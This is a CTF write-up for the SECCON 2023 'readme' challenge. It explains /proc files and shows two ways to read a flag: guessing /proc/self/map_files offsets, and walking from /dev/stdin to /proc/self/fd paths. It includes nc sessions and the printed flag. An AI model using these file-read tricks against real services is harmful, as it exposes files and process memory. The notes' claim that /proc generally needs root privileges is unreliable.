# Lesson Learn
- `/proc/self/syscall`  
    In a Unix-like operating system, including Linux, `/proc/self/syscall` is a special file that provides a way for a process to access its own system call number. This file is part of the `/proc` file system, which is a virtual file system that exposes various kernel and process-related information in a structured way.  

    Here's how it works:  

    `/proc` is a virtual file system mounted on many Unix-like systems, including Linux. It provides a way for processes and users to interact with kernel-related information and statistics.  

    `/proc/self` is a symbolic link that always points to the process directory of the currently executing process. It allows a process to access information about itself without needing to know its own process ID.  

    `/proc/self/syscall` is a file within the process directory that contains the system call number of the most recent system call made by the process. Reading from this file will give you the system call number that was executed by the process.

    Please note that accessing `/proc` and its contents generally requires administrative or root privileges, and it's mainly used for debugging, monitoring, and low-level system-related tasks. Most application-level code does not need to interact with these files directly.  
- a merit of `/proc`  
    The `/proc` file system in Linux provides several merits and advantages for system administrators, developers, and users when it comes to managing and understanding the system. Here are some of the merits of the /proc file system:

    - Dynamic System Information:  
        `/proc` provides a dynamic view of various system-related information. This means that the information is updated in real-time, reflecting the current state of the system. This is extremely useful for monitoring and debugging purposes.  

    - Easy Access to Kernel Parameters:  
        Many kernel parameters and settings can be easily modified by writing values to the files in `/proc`. This allows administrators to make runtime changes to the kernel without needing to reboot the system.

    - Process Information:  
        `/proc` includes directories for each running process on the system. These directories contain detailed information about each process, such as its status, memory usage, file descriptor information, and more. This is valuable for process management and debugging.  

    - Hardware Information:  
        `/proc` provides information about hardware devices, CPU details, memory statistics, and other hardware-related information. This can be helpful for hardware profiling and diagnosis.  

    - Kernel Module Information:  
        Information about loaded kernel modules is available in `/proc/modules`. This can be useful for managing and troubleshooting kernel modules.  

    - Performance Monitoring:  
        `/proc` offers access to performance-related data, such as CPU usage, memory usage, disk I/O statistics, and network statistics. Tools like top and vmstat rely on `/proc` to display system performance metrics.  

    - Debugging and Profiling:  
        Developers and system administrators can use `/proc` to gather information for debugging and profiling applications and the kernel itself. It's a valuable resource for diagnosing and resolving issues.  

    - Scripting and Automation:  
        Since `/proc` is accessible through the file system, it can be easily accessed and manipulated using shell scripts and programming languages like Python. This makes it a powerful tool for automating system tasks and collecting information.  

    - Security Auditing:  
        Security tools and utilities can use `/proc` to monitor and audit system activities, helping to detect and respond to security breaches and suspicious activities.  

    - Compatibility:  
        `/proc` provides a standardized way to access system information and interact with the kernel, making it consistent across different Linux distributions and kernel versions.  

    While `/proc` offers many advantages, it's important to note that not all files and directories in `/proc` are meant for casual user interaction. Some of the information and settings within `/proc` require a deep understanding of the Linux kernel and should be used with caution. Additionally, access to certain files and directories in `/proc` may require elevated privileges.

- `/proc/self/maps`  
- `/proc/self/map_files/(xxxx)-(xxxx)`  
- `/proc/self/fd/`  
- `/dev/stdin`  --> `/proc/self/fd/0`  
- `mmap` in Python  
    ```py
    f = open("./flag.txt", "r")
    mm = mmap.mmap(f.fileno(), 0, prot=mmap.PROT_READ)
    ```
    `mmap` is a module in Python that provides functions for memory-mapped file I/O. Memory-mapped files allow you to map a file directly into memory, which can be useful for efficient file reading and writing.  

    `f.fileno()` is used to get the file descriptor of the file f. The file descriptor is a low-level integer identifier for an open file.

    `0` is the length argument, which specifies the length of the memory-mapped region. In this case, it's set to 0, which means the entire file will be mapped into memory.  

    `prot=mmap.PROT_READ `specifies the protection level for the memory-mapped region. In this case, it's set to mmap.PROT_READ, which means that the memory-mapped region is read-only. This means you can read data from the memory-mapped file, but you cannot write to it.  

    So, the code creates a memory-mapped file object mm that maps the entire content of the file represented by the file descriptor f.fileno() into memory in a read-only mode. You can then use the mm object to efficiently read data from the file as if it were in memory.  


# Write Up
There are two solutions.
- solution 1 : open map_files/(xxxx)-(xxxx)
- solution 2 : bypass fd  

## solution 1 : open map_files/(xxxx)-(xxxx)
1. check a characteristics around /proc/self/syscall and /proc/self/maps  
    e.g.
    ```console
    $ nc readme-2023.seccon.games 2023
    path: /proc/self/maps
    b'
    55d0743de000-55d0743df000 r--p 00000000 fc:03 1058172  /usr/local/bin/python3.11
    55d0743df000-55d0743e0000 r-xp 00001000 fc:03 1058172  /usr/local/bin/python3.11
    55d0743e0000-55d0743e1000 r--p 00002000 fc:03 1058172
    '
    path: /proc/self/syscall
    b'0 0x5 0x55d07575e6b0 0x400 0x2 0x0 0x0 0x7ffe8e485d38 0x7f332976907d\n'
    ```
2. guess and calculate an offset using a local container.  
    First, edit server.py like this.  
    - before
        ```py
            with open(os.path.realpath(path), "rb") as f:
                print(f.read(0x100))
        ```
    - after  
        ```py
            with open(os.path.realpath(path), "rb") as f:
                print(f.read())
        ```
    build a container on a local machine  
    ![Offset Calc Image](offsetCalc.png) 

3. try the same logic on a target machine
    ```console
    $ nc readme-2023.seccon.games 2023
    path: /proc/self/syscall
    b'0 0x7 0x55ff3af0b6b0 0x400 0x2 0x0 0x0 0x7ffdbcab9868 0x7f655358f07d\n'
    path: /proc/self/map_files/7f6553679000-7f655367a000
    b'SECCON{y3t_4n0th3r_pr0cf5_tr1ck:)}\n'
    ```

## solution 2 : bypass fd  
`/dev/stdin` --> `/proc/self/fd/0`  
`/dev/stdin/../` --> `/proc/self/fd`  
`/dev/stdin/../6` --> `/proc/self/fd/6`
